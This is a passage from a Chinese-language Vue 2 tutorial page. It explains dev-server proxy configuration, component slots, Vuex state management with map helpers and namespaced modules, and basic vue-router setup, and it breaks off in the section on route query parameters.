class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>说明：</p><ol><li>优点：配置简单，请求资源时直接发给前端（8080）即可。</li><li>缺点：不能配置多个代理，不能灵活的控制请求是否走代理。</li><li>工作方式：若按照上述配置代理，当请求了前端不存在的资源时，那么该请求会转发给服务器 （优先匹配前端资源）</li></ol><h3 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h3><p>​    编写vue.config.js配置具体代理规则：</p><pre class="line-numbers language-js" data-language="js"><code class="language-js">module<span class="token punctuation">.</span>exports <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token literal-property property">devServer</span><span class="token operator">:</span> <span class="token punctuation">{</span>      <span class="token literal-property property">proxy</span><span class="token operator">:</span> <span class="token punctuation">{</span>      <span class="token string-property property">'/api1'</span><span class="token operator">:</span> <span class="token punctuation">{</span><span class="token comment">// 匹配所有以 '/api1'开头的请求路径</span>        <span class="token literal-property property">target</span><span class="token operator">:</span> <span class="token string">'http://localhost:5000'</span><span class="token punctuation">,</span><span class="token comment">// 代理目标的基础路径</span>        <span class="token literal-property property">changeOrigin</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>        <span class="token literal-property property">pathRewrite</span><span class="token operator">:</span> <span class="token punctuation">{</span><span class="token string-property property">'^/api1'</span><span class="token operator">:</span> <span class="token string">''</span><span class="token punctuation">}</span>      <span class="token punctuation">}</span><span class="token punctuation">,</span>      <span class="token string-property property">'/api2'</span><span class="token operator">:</span> <span class="token punctuation">{</span><span class="token comment">// 匹配所有以 '/api2'开头的请求路径</span>        <span class="token literal-property property">target</span><span class="token operator">:</span> <span class="token string">'http://localhost:5001'</span><span class="token punctuation">,</span><span class="token comment">// 代理目标的基础路径</span>        <span class="token literal-property property">changeOrigin</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>        <span class="token literal-property property">pathRewrite</span><span class="token operator">:</span> <span class="token punctuation">{</span><span class="token string-property property">'^/api2'</span><span class="token operator">:</span> <span class="token string">''</span><span class="token punctuation">}</span>      <span class="token punctuation">}</span>    <span class="token punctuation">}</span>  <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token comment">/*   changeOrigin设置为true时，服务器收到的请求头中的host为：localhost:5000   changeOrigin设置为false时，服务器收到的请求头中的host为：localhost:8080   changeOrigin默认值为true*/</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>说明：</p><ol><li>优点：可以配置多个代理，且可以灵活的控制请求是否走代理。</li><li>缺点：配置略微繁琐，请求资源时必须加前缀。</li></ol><h2 id="插槽"><a href="#插槽" class="headerlink" title="插槽"></a>插槽</h2><ol><li><p>作用：让父组件可以向子组件指定位置插入html结构，也是一种组件间通信的方式，适用于 <strong style="color:red">父组件 ===&gt; 子组件</strong> 。</p></li><li><p>分类：默认插槽、具名插槽、作用域插槽</p></li><li><p>使用方式：</p><ol><li><p>默认插槽：</p><pre class="line-numbers language-vue" data-language="vue"><code class="language-vue">父组件中：        &lt;Category&gt;           &lt;div&gt;html结构1&lt;/div&gt;        &lt;/Category&gt;子组件中：        &lt;template&gt;            &lt;div&gt;               &lt;!-- 定义插槽 --&gt;               &lt;slot&gt;插槽默认内容...&lt;/slot&gt;            &lt;/div&gt;        &lt;/template&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>具名插槽：</p><pre class="line-numbers language-vue" data-language="vue"><code class="language-vue">父组件中：        &lt;Category&gt;            &lt;template slot="center"&gt;              &lt;div&gt;html结构1&lt;/div&gt;            &lt;/template&gt;            &lt;template v-slot:footer&gt;               &lt;div&gt;html结构2&lt;/div&gt;            &lt;/template&gt;        &lt;/Category&gt;子组件中：        &lt;template&gt;            &lt;div&gt;               &lt;!-- 定义插槽 --&gt;               &lt;slot name="center"&gt;插槽默认内容...&lt;/slot&gt;               &lt;slot name="footer"&gt;插槽默认内容...&lt;/slot&gt;            &lt;/div&gt;        &lt;/template&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>作用域插槽：</p><ol><li><p>理解：<span style="color:red">数据在组件的自身，但根据数据生成的结构需要组件的使用者来决定。</span>（games数据在Category组件中，但使用数据所遍历出来的结构由App组件决定）</p></li><li><p>具体编码：</p><pre class="line-numbers language-vue" data-language="vue"><code class="language-vue">父组件中：&lt;Category&gt;&lt;template scope="scopeData"&gt;&lt;!-- 生成的是ul列表 --&gt;&lt;ul&gt;&lt;li v-for="g in scopeData.games" :key="g"&gt;{{g}}&lt;/li&gt;&lt;/ul&gt;&lt;/template&gt;&lt;/Category&gt;&lt;Category&gt;&lt;template slot-scope="scopeData"&gt;&lt;!-- 生成的是h4标题 --&gt;&lt;h4 v-for="g in scopeData.games" :key="g"&gt;{{g}}&lt;/h4&gt;&lt;/template&gt;&lt;/Category&gt;子组件中：        &lt;template&gt;            &lt;div&gt;                &lt;slot :games="games"&gt;&lt;/slot&gt;            &lt;/div&gt;        &lt;/template&gt;        &lt;script&gt;            export default {                name:'Category',                props:['title'],                //数据在子组件自身                data() {                    return {                        games:['红色警戒','穿越火线','劲舞团','超级玛丽']                    }                },            }        &lt;/script&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ol></li></ol><pre class="line-numbers language-none"><code class="language-none">   <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li></ol><h2 id="Vuex"><a href="#Vuex" class="headerlink" title="Vuex"></a>Vuex</h2><h3 id="1-概念"><a href="#1-概念" class="headerlink" title="1.概念"></a>1.概念</h3><p>​        在Vue中实现集中式状态（数据）管理的一个Vue插件，对vue应用中多个组件的共享状态进行集中式的管理（读/写），也是一种组件间通信的方式，且适用于任意组件间通信。</p><h3 id="2-何时使用？"><a href="#2-何时使用？" class="headerlink" title="2.何时使用？"></a>2.何时使用？</h3><p>​        多个组件需要共享数据时</p><h3 id="3-搭建vuex环境"><a href="#3-搭建vuex环境" class="headerlink" title="3.搭建vuex环境"></a>3.搭建vuex环境</h3><ol><li><p>创建文件：<code>src/store/index.js</code></p><pre class="line-numbers language-js" data-language="js"><code class="language-js"><span class="token comment">//引入Vue核心库</span><span class="token keyword">import</span> Vue <span class="token keyword">from</span> <span class="token string">'vue'</span><span class="token comment">//引入Vuex</span><span class="token keyword">import</span> Vuex <span class="token keyword">from</span> <span class="token string">'vuex'</span><span class="token comment">//应用Vuex插件</span>Vue<span class="token punctuation">.</span><span class="token function">use</span><span class="token punctuation">(</span>Vuex<span class="token punctuation">)</span><span class="token comment">//准备actions对象——响应组件中用户的动作</span><span class="token keyword">const</span> actions <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token comment">//准备mutations对象——修改state中的数据</span><span class="token keyword">const</span> mutations <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token comment">//准备state对象——保存具体的数据</span><span class="token keyword">const</span> state <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token comment">//创建并暴露store</span><span class="token keyword">export</span> <span class="token keyword">default</span> <span class="token keyword">new</span> <span class="token class-name">Vuex<span class="token punctuation">.</span>Store</span><span class="token punctuation">(</span><span class="token punctuation">{</span>actions<span class="token punctuation">,</span>mutations<span class="token punctuation">,</span>state<span class="token punctuation">}</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>在<code>main.js</code>中创建vm时传入<code>store</code>配置项</p><pre class="line-numbers language-js" data-language="js"><code class="language-js"><span class="token operator">...</span><span class="token operator">...</span><span class="token comment">//引入store</span><span class="token keyword">import</span> store <span class="token keyword">from</span> <span class="token string">'./store'</span><span class="token operator">...</span><span class="token operator">...</span><span class="token comment">//创建vm</span><span class="token keyword">new</span> <span class="token class-name">Vue</span><span class="token punctuation">(</span><span class="token punctuation">{</span><span class="token literal-property property">el</span><span class="token operator">:</span><span class="token string">'#app'</span><span class="token punctuation">,</span><span class="token function-variable function">render</span><span class="token operator">:</span> <span class="token parameter">h</span> <span class="token operator">=&gt;</span> <span class="token function">h</span><span class="token punctuation">(</span>App<span class="token punctuation">)</span><span class="token punctuation">,</span>store<span class="token punctuation">}</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ol><h3 id="4-基本使用"><a href="#4-基本使用" class="headerlink" title="4.基本使用"></a>4.基本使用</h3><ol><li><p>初始化数据、配置<code>actions</code>、配置<code>mutations</code>，操作文件<code>store.js</code></p><pre class="line-numbers language-js" data-language="js"><code class="language-js"><span class="token comment">//引入Vue核心库</span><span class="token keyword">import</span> Vue <span class="token keyword">from</span> <span class="token string">'vue'</span><span class="token comment">//引入Vuex</span><span class="token keyword">import</span> Vuex <span class="token keyword">from</span> <span class="token string">'vuex'</span><span class="token comment">//引用Vuex</span>Vue<span class="token punctuation">.</span><span class="token function">use</span><span class="token punctuation">(</span>Vuex<span class="token punctuation">)</span><span class="token keyword">const</span> actions <span class="token operator">=</span> <span class="token punctuation">{</span>    <span class="token comment">//响应组件中加的动作</span><span class="token function">jia</span><span class="token punctuation">(</span><span class="token parameter">context<span class="token punctuation">,</span>value</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token comment">// console.log('actions中的jia被调用了',miniStore,value)</span>context<span class="token punctuation">.</span><span class="token function">commit</span><span class="token punctuation">(</span><span class="token string">'JIA'</span><span class="token punctuation">,</span>value<span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token punctuation">}</span><span class="token keyword">const</span> mutations <span class="token operator">=</span> <span class="token punctuation">{</span>    <span class="token comment">//执行加</span><span class="token constant">JIA</span><span class="token punctuation">(</span><span class="token parameter">state<span class="token punctuation">,</span>value</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token comment">// console.log('mutations中的JIA被调用了',state,value)</span>state<span class="token punctuation">.</span>sum <span class="token operator">+=</span> value<span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token comment">//初始化数据</span><span class="token keyword">const</span> state <span class="token operator">=</span> <span class="token punctuation">{</span>   <span class="token literal-property property">sum</span><span class="token operator">:</span><span class="token number">0</span><span class="token punctuation">}</span><span class="token comment">//创建并暴露store</span><span class="token keyword">export</span> <span class="token keyword">default</span> <span class="token keyword">new</span> <span class="token class-name">Vuex<span class="token punctuation">.</span>Store</span><span class="token punctuation">(</span><span class="token punctuation">{</span>actions<span class="token punctuation">,</span>mutations<span class="token punctuation">,</span>state<span class="token punctuation">,</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>组件中读取vuex中的数据：<code>$store.state.sum</code></p></li><li><p>组件中修改vuex中的数据：<code>$store.dispatch('action中的方法名',数据)</code> 或 <code>$store.commit('mutations中的方法名',数据)</code></p><blockquote><p> 备注：若没有网络请求或其他业务逻辑，组件中也可以越过actions，即不写<code>dispatch</code>，直接编写<code>commit</code></p></blockquote></li></ol><h3 id="5-getters的使用"><a href="#5-getters的使用" class="headerlink" title="5.getters的使用"></a>5.getters的使用</h3><ol><li><p>概念：当state中的数据需要经过加工后再使用时，可以使用getters加工。</p></li><li><p>在<code>store.js</code>中追加<code>getters</code>配置</p><pre class="line-numbers language-js" data-language="js"><code class="language-js"><span class="token operator">...</span><span class="token operator">...</span><span class="token keyword">const</span> getters <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token function">bigSum</span><span class="token punctuation">(</span><span class="token parameter">state</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">return</span> state<span class="token punctuation">.</span>sum <span class="token operator">*</span> <span class="token number">10</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token comment">//创建并暴露store</span><span class="token keyword">export</span> <span class="token keyword">default</span> <span class="token keyword">new</span> <span class="token class-name">Vuex<span class="token punctuation">.</span>Store</span><span class="token punctuation">(</span><span class="token punctuation">{</span><span class="token operator">...</span><span class="token operator">...</span>getters<span class="token punctuation">}</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>组件中读取数据：<code>$store.getters.bigSum</code></p></li></ol><h3 id="6-四个map方法的使用"><a href="#6-四个map方法的使用" class="headerlink" title="6.四个map方法的使用"></a>6.四个map方法的使用</h3><ol><li><p><strong>mapState方法：</strong>用于帮助我们映射<code>state</code>中的数据为计算属性</p><pre class="line-numbers language-js" data-language="js"><code class="language-js"><span class="token literal-property property">computed</span><span class="token operator">:</span> <span class="token punctuation">{</span>    <span class="token comment">//借助mapState生成计算属性：sum、school、subject（对象写法）</span>     <span class="token operator">...</span><span class="token function">mapState</span><span class="token punctuation">(</span><span class="token punctuation">{</span><span class="token literal-property property">sum</span><span class="token operator">:</span><span class="token string">'sum'</span><span class="token punctuation">,</span><span class="token literal-property property">school</span><span class="token operator">:</span><span class="token string">'school'</span><span class="token punctuation">,</span><span class="token literal-property property">subject</span><span class="token operator">:</span><span class="token string">'subject'</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">,</span>             <span class="token comment">//借助mapState生成计算属性：sum、school、subject（数组写法）</span>    <span class="token operator">...</span><span class="token function">mapState</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">'sum'</span><span class="token punctuation">,</span><span class="token string">'school'</span><span class="token punctuation">,</span><span class="token string">'subject'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token punctuation">}</span><span class="token punctuation">,</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p><strong>mapGetters方法：</strong>用于帮助我们映射<code>getters</code>中的数据为计算属性</p><pre class="line-numbers language-js" data-language="js"><code class="language-js"><span class="token literal-property property">computed</span><span class="token operator">:</span> <span class="token punctuation">{</span>    <span class="token comment">//借助mapGetters生成计算属性：bigSum（对象写法）</span>    <span class="token operator">...</span><span class="token function">mapGetters</span><span class="token punctuation">(</span><span class="token punctuation">{</span><span class="token literal-property property">bigSum</span><span class="token operator">:</span><span class="token string">'bigSum'</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">,</span>    <span class="token comment">//借助mapGetters生成计算属性：bigSum（数组写法）</span>    <span class="token operator">...</span><span class="token function">mapGetters</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">'bigSum'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">,</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p><strong>mapActions方法：</strong>用于帮助我们生成与<code>actions</code>对话的方法，即：包含<code>$store.dispatch(xxx)</code>的函数</p><pre class="line-numbers language-js" data-language="js"><code class="language-js"><span class="token literal-property property">methods</span><span class="token operator">:</span><span class="token punctuation">{</span>    <span class="token comment">//靠mapActions生成：incrementOdd、incrementWait（对象形式）</span>    <span class="token operator">...</span><span class="token function">mapActions</span><span class="token punctuation">(</span><span class="token punctuation">{</span><span class="token literal-property property">incrementOdd</span><span class="token operator">:</span><span class="token string">'jiaOdd'</span><span class="token punctuation">,</span><span class="token literal-property property">incrementWait</span><span class="token operator">:</span><span class="token string">'jiaWait'</span><span class="token punctuation">}</span><span class="token punctuation">)</span>    <span class="token comment">//靠mapActions生成：incrementOdd、incrementWait（数组形式）</span>    <span class="token operator">...</span><span class="token function">mapActions</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">'jiaOdd'</span><span class="token punctuation">,</span><span class="token string">'jiaWait'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p><strong>mapMutations方法：</strong>用于帮助我们生成与<code>mutations</code>对话的方法，即：包含<code>$store.commit(xxx)</code>的函数</p><pre class="line-numbers language-js" data-language="js"><code class="language-js"><span class="token literal-property property">methods</span><span class="token operator">:</span><span class="token punctuation">{</span>    <span class="token comment">//靠mapActions生成：increment、decrement（对象形式）</span>    <span class="token operator">...</span><span class="token function">mapMutations</span><span class="token punctuation">(</span><span class="token punctuation">{</span><span class="token literal-property property">increment</span><span class="token operator">:</span><span class="token string">'JIA'</span><span class="token punctuation">,</span><span class="token literal-property property">decrement</span><span class="token operator">:</span><span class="token string">'JIAN'</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">,</span>        <span class="token comment">//靠mapMutations生成：JIA、JIAN（对象形式）</span>    <span class="token operator">...</span><span class="token function">mapMutations</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">'JIA'</span><span class="token punctuation">,</span><span class="token string">'JIAN'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ol><blockquote><p>备注：mapActions与mapMutations使用时，若需要传递参数需要：在模板中绑定事件时传递好参数，否则参数是事件对象。</p></blockquote><h3 id="7-模块化-命名空间"><a href="#7-模块化-命名空间" class="headerlink" title="7.模块化+命名空间"></a>7.模块化+命名空间</h3><ol><li><p>目的：让代码更好维护，让多种数据分类更加明确。</p></li><li><p>修改<code>store.js</code></p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">const</span> countAbout <span class="token operator">=</span> <span class="token punctuation">{</span>  <span class="token literal-property property">namespaced</span><span class="token operator">:</span><span class="token boolean">true</span><span class="token punctuation">,</span><span class="token comment">//开启命名空间</span>  <span class="token literal-property property">state</span><span class="token operator">:</span><span class="token punctuation">{</span><span class="token literal-property property">x</span><span class="token operator">:</span><span class="token number">1</span><span class="token punctuation">}</span><span class="token punctuation">,</span>  <span class="token literal-property property">mutations</span><span class="token operator">:</span> <span class="token punctuation">{</span> <span class="token operator">...</span> <span class="token punctuation">}</span><span class="token punctuation">,</span>  <span class="token literal-property property">actions</span><span class="token operator">:</span> <span class="token punctuation">{</span> <span class="token operator">...</span> <span class="token punctuation">}</span><span class="token punctuation">,</span>  <span class="token literal-property property">getters</span><span class="token operator">:</span> <span class="token punctuation">{</span>    <span class="token function">bigSum</span><span class="token punctuation">(</span><span class="token parameter">state</span><span class="token punctuation">)</span><span class="token punctuation">{</span>       <span class="token keyword">return</span> state<span class="token punctuation">.</span>sum <span class="token operator">*</span> <span class="token number">10</span>    <span class="token punctuation">}</span>  <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">const</span> personAbout <span class="token operator">=</span> <span class="token punctuation">{</span>  <span class="token literal-property property">namespaced</span><span class="token operator">:</span><span class="token boolean">true</span><span class="token punctuation">,</span><span class="token comment">//开启命名空间</span>  <span class="token literal-property property">state</span><span class="token operator">:</span><span class="token punctuation">{</span> <span class="token operator">...</span> <span class="token punctuation">}</span><span class="token punctuation">,</span>  <span class="token literal-property property">mutations</span><span class="token operator">:</span> <span class="token punctuation">{</span> <span class="token operator">...</span> <span class="token punctuation">}</span><span class="token punctuation">,</span>  <span class="token literal-property property">actions</span><span class="token operator">:</span> <span class="token punctuation">{</span> <span class="token operator">...</span> <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">const</span> store <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Vuex<span class="token punctuation">.</span>Store</span><span class="token punctuation">(</span><span class="token punctuation">{</span>  <span class="token literal-property property">modules</span><span class="token operator">:</span> <span class="token punctuation">{</span>    countAbout<span class="token punctuation">,</span>    personAbout  <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>开启命名空间后，组件中读取state数据：</p><pre class="line-numbers language-js" data-language="js"><code class="language-js"><span class="token comment">//方式一：自己直接读取</span><span class="token keyword">this</span><span class="token punctuation">.</span>$store<span class="token punctuation">.</span>state<span class="token punctuation">.</span>personAbout<span class="token punctuation">.</span>list<span class="token comment">//方式二：借助mapState读取：</span><span class="token operator">...</span><span class="token function">mapState</span><span class="token punctuation">(</span><span class="token string">'countAbout'</span><span class="token punctuation">,</span><span class="token punctuation">[</span><span class="token string">'sum'</span><span class="token punctuation">,</span><span class="token string">'school'</span><span class="token punctuation">,</span><span class="token string">'subject'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>开启命名空间后，组件中读取getters数据：</p><pre class="line-numbers language-js" data-language="js"><code class="language-js"><span class="token comment">//方式一：自己直接读取</span><span class="token keyword">this</span><span class="token punctuation">.</span>$store<span class="token punctuation">.</span>getters<span class="token punctuation">[</span><span class="token string">'personAbout/firstPersonName'</span><span class="token punctuation">]</span><span class="token comment">//方式二：借助mapGetters读取：</span><span class="token operator">...</span><span class="token function">mapGetters</span><span class="token punctuation">(</span><span class="token string">'countAbout'</span><span class="token punctuation">,</span><span class="token punctuation">[</span><span class="token string">'bigSum'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>开启命名空间后，组件中调用dispatch</p><pre class="line-numbers language-js" data-language="js"><code class="language-js"><span class="token comment">//方式一：自己直接dispatch</span><span class="token keyword">this</span><span class="token punctuation">.</span>$store<span class="token punctuation">.</span><span class="token function">dispatch</span><span class="token punctuation">(</span><span class="token string">'personAbout/addPersonWang'</span><span class="token punctuation">,</span>person<span class="token punctuation">)</span><span class="token comment">//方式二：借助mapActions：</span><span class="token operator">...</span><span class="token function">mapActions</span><span class="token punctuation">(</span><span class="token string">'countAbout'</span><span class="token punctuation">,</span><span class="token punctuation">{</span><span class="token literal-property property">incrementOdd</span><span class="token operator">:</span><span class="token string">'jiaOdd'</span><span class="token punctuation">,</span><span class="token literal-property property">incrementWait</span><span class="token operator">:</span><span class="token string">'jiaWait'</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>开启命名空间后，组件中调用commit</p><pre class="line-numbers language-js" data-language="js"><code class="language-js"><span class="token comment">//方式一：自己直接commit</span><span class="token keyword">this</span><span class="token punctuation">.</span>$store<span class="token punctuation">.</span><span class="token function">commit</span><span class="token punctuation">(</span><span class="token string">'personAbout/ADD_PERSON'</span><span class="token punctuation">,</span>person<span class="token punctuation">)</span><span class="token comment">//方式二：借助mapMutations：</span><span class="token operator">...</span><span class="token function">mapMutations</span><span class="token punctuation">(</span><span class="token string">'countAbout'</span><span class="token punctuation">,</span><span class="token punctuation">{</span><span class="token literal-property property">increment</span><span class="token operator">:</span><span class="token string">'JIA'</span><span class="token punctuation">,</span><span class="token literal-property property">decrement</span><span class="token operator">:</span><span class="token string">'JIAN'</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre></li></ol><h2 id="路由"><a href="#路由" class="headerlink" title="路由"></a>路由</h2><ol><li>理解： 一个路由（route）就是一组映射关系（key - value），多个路由需要路由器（router）进行管理。</li><li>前端路由：key是路径，value是组件。</li></ol><h3 id="1-基本使用"><a href="#1-基本使用" class="headerlink" title="1.基本使用"></a>1.基本使用</h3><ol><li><p>安装vue-router，命令：<code>npm i vue-router@3</code></p></li><li><p>应用插件：<code>Vue.use(VueRouter)</code></p></li><li><p>编写router配置项:</p><pre class="line-numbers language-js" data-language="js"><code class="language-js"><span class="token comment">//引入VueRouter</span><span class="token keyword">import</span> VueRouter <span class="token keyword">from</span> <span class="token string">'vue-router'</span><span class="token comment">//引入Luyou 组件</span><span class="token keyword">import</span> About <span class="token keyword">from</span> <span class="token string">'../components/About'</span><span class="token keyword">import</span> Home <span class="token keyword">from</span> <span class="token string">'../components/Home'</span><span class="token comment">//创建router实例对象，去管理一组一组的路由规则</span><span class="token keyword">const</span> router <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">VueRouter</span><span class="token punctuation">(</span><span class="token punctuation">{</span><span class="token literal-property property">routes</span><span class="token operator">:</span><span class="token punctuation">[</span><span class="token punctuation">{</span><span class="token literal-property property">path</span><span class="token operator">:</span><span class="token string">'/about'</span><span class="token punctuation">,</span><span class="token literal-property property">component</span><span class="token operator">:</span>About<span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token punctuation">{</span><span class="token literal-property property">path</span><span class="token operator">:</span><span class="token string">'/home'</span><span class="token punctuation">,</span><span class="token literal-property property">component</span><span class="token operator">:</span>Home<span class="token punctuation">}</span><span class="token punctuation">]</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token comment">//暴露router</span><span class="token keyword">export</span> <span class="token keyword">default</span> router<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>实现切换（active-class可配置高亮样式）</p><pre class="line-numbers language-vue" data-language="vue"><code class="language-vue">&lt;router-link active-class="active" to="/about"&gt;About&lt;/router-link&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>指定展示位置</p><pre class="line-numbers language-vue" data-language="vue"><code class="language-vue">&lt;router-view&gt;&lt;/router-view&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li></ol><h3 id="2-几个注意点"><a href="#2-几个注意点" class="headerlink" title="2.几个注意点"></a>2.几个注意点</h3><ol><li>路由组件通常存放在<code>pages</code>文件夹，一般组件通常存放在<code>components</code>文件夹。</li><li>通过切换，“隐藏”了的路由组件，默认是被销毁掉的，需要的时候再去挂载。</li><li>每个组件都有自己的<code>$route</code>属性，里面存储着自己的路由信息。</li><li>整个应用只有一个router，可以通过组件的<code>$router</code>属性获取到。</li></ol><h3 id="3-多级路由（多级路由）"><a href="#3-多级路由（多级路由）" class="headerlink" title="3.多级路由（多级路由）"></a>3.多级路由（多级路由）</h3><ol><li><p>配置路由规则，使用children配置项：</p><pre class="line-numbers language-js" data-language="js"><code class="language-js"><span class="token literal-property property">routes</span><span class="token operator">:</span><span class="token punctuation">[</span><span class="token punctuation">{</span><span class="token literal-property property">path</span><span class="token operator">:</span><span class="token string">'/about'</span><span class="token punctuation">,</span><span class="token literal-property property">component</span><span class="token operator">:</span>About<span class="token punctuation">,</span><span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token punctuation">{</span><span class="token literal-property property">path</span><span class="token operator">:</span><span class="token string">'/home'</span><span class="token punctuation">,</span><span class="token literal-property property">component</span><span class="token operator">:</span>Home<span class="token punctuation">,</span><span class="token literal-property property">children</span><span class="token operator">:</span><span class="token punctuation">[</span> <span class="token comment">//通过children配置子级路由</span><span class="token punctuation">{</span><span class="token literal-property property">path</span><span class="token operator">:</span><span class="token string">'news'</span><span class="token punctuation">,</span> <span class="token comment">//此处一定不要写：/news</span><span class="token literal-property property">component</span><span class="token operator">:</span>News<span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token punctuation">{</span><span class="token literal-property property">path</span><span class="token operator">:</span><span class="token string">'message'</span><span class="token punctuation">,</span><span class="token comment">//此处一定不要写：/message</span><span class="token literal-property property">component</span><span class="token operator">:</span>Message<span class="token punctuation">}</span><span class="token punctuation">]</span><span class="token punctuation">}</span><span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>跳转（要写完整路径）：</p><pre class="line-numbers language-vue" data-language="vue"><code class="language-vue">&lt;router-link to="/home/news"&gt;News&lt;/router-link&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li></ol><h3 id="4-路由的query参数"><a href="#4-路由的query参数" class="headerlink" title="4.路由的query参数"></a>4.路由的query参数</h3><ol><li><p>传递参数</p><pre class="line-numbers language-vue" data-language="vue"><code class="language-vue">&lt;!-- 跳转并携带query参数，to的字符串写法 